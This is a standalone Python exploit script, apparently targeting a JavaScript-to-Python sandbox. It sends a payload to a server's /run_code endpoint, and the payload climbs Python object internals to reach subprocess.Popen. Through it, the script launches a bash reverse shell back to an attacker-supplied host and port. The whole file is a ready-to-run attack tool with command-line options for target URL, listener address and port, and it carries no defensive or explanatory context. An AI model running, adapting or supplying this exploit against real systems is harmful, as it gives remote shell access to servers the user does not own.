#!/usr/bin/env python3
"""


"""

import requests
import argparse

def create_payload(lhost, lport):
    """Your exact working payload"""
    return f"""let cmd = "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {{
    return n11
}}
"""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-l', '--lhost', required=True)
    parser.add_argument('-p', '--lport', required=True, type=int)
    
    args = parser.parse_args()
    
    payload = create_payload(args.lhost, args.lport)
    
    response = requests.post(
        f"{args.url}/run_code",
        headers={'Content-Type': 'application/json'},
        json={'code': payload}
    )
    
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")

if __name__ == "__main__":
    main()
